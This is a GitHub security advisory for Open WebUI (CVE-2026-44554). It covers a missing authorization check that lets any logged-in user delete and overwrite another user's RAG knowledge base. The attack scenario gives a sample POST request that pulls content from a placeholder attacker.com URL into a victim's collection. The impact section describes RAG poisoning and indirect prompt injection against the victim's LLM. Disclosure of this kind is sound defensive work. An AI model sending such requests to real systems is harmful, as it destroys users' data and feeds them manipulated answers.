# [H] Open WebUI has Knowledge Base Destruction and RAG Poisoning via Unauthorized Collection Overwrite

## Summary
Severity: High
Advisory: GHSA-7r82-qhg4-6wvj
CVE: CVE-2026-44554
CWE: CWE-862
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-7r82-qhg4-6wvj
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.0

## Details
# Knowledge Base Destruction and RAG Poisoning via Unauthorized Collection Overwrite

## Affected Component

Retrieval web/YouTube processing endpoints:
- `backend/open_webui/routers/retrieval.py` (lines 1810-1837, `process_web`)
- `backend/open_webui/routers/retrieval.py` (the parallel `process_youtube` endpoint)
- `backend/open_webui/routers/retrieval.py` (line 1445, `save_docs_to_vector_db` call chain)

## Affected Versions

Current main branch (commit `6fdd19bf1`) and likely all versions with RAG/knowledge base functionality.

## Description

The `POST /api/v1/retrieval/process/web` endpoint accepts a user-supplied `collection_name` and an `overwrite` query parameter (default: `True`). It performs no authorization check on whether the calling user owns or has write access to the target collection. When `overwrite=True`, `save_docs_to_vector_db` calls `VECTOR_DB_CLIENT.delete_collection()` on the target collection before writing new content.

Combined with the knowledge base enumeration vulnerability (separate report), an attacker can trivially discover any user's knowledge base UUID and then destroy or poison it.

```python
# retrieval.py:1810-1837 — no collection authorization check
@router.post('/process/web')
async def process_web(
    request: Request,
    form_data: ProcessUrlForm,
    user=Depends(get_verified_user),
    ...
):
    # ... fetch and process the URL ...
    save_docs_to_vector_db(
        request=request,
        docs=docs,
        collection_name=form_data.collection_name,  # attacker-controlled, unchecked
        overwrite=overwrite,                        # defaults to True
        ...
    )
```

## CVSS 3.1 Breakdown

| Metric | Value | Rationale |
|--------|-------|-----------|
| Attack Vector | Network (N) | Exploited remotely via API call |
| Attack Complexity | Low (L) | Single API call with a known KB UUID |
| Privileges Required | Low (L) | Requires any authenticated user account |
| User Interaction | None (N) | No victim interaction required |
| Scope | Unchanged (U) | Impact within the knowledge base authorization boundary |
| Confidentiality | None (N) | No data disclosure from this vulnerability directly |
| Integrity | High (H) | Complete replacement of victim's KB content with attacker-controlled data |
| Availability | High (H) | Victim's original KB embeddings are deleted; KB effectively destroyed |

## Attack Scenario

1. Attacker discovers victim's KB UUID via the `knowledge-bases` meta-collection (separate finding) or other enumeration.
2. Attacker sends:
   ```
   POST /api/v1/retrieval/process/web?overwrite=true
   {
     "url": "https://attacker.com/poison",
     "collection_name": "<victim_kb_uuid>"
   }
   ```
3. The endpoint fetches content from the attacker's URL.
4. `save_docs_to_vector_db` deletes the entire vector collection belonging to the victim's knowledge base.
5. The attacker's fetched content is embedded and written as the new collection content.
6. Victim's RAG queries against their KB now return attacker-controlled content instead of their original documents.

## Impact

- **Data destruction:** Victim's original KB embeddings are permanently deleted from the vector store
- **RAG poisoning:** Attacker-controlled content replaces legitimate knowledge, causing the LLM to return misleading or malicious answers to the victim
- **Indirect prompt injection:** Poisoned content can contain crafted prompts that manipulate the victim's LLM behavior when queried
- **Persistence:** The poisoned content persists until the KB is rebuilt from source files

## Preconditions

- Attacker must have a valid user account
- Attacker must know the target collection name (KB UUID) — easily obtained via the `knowledge-bases` enumeration finding

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-7r82-qhg4-6wvj
- https://nvd.nist.gov/vuln/detail/CVE-2026-44554
- https://github.com/open-webui/open-webui
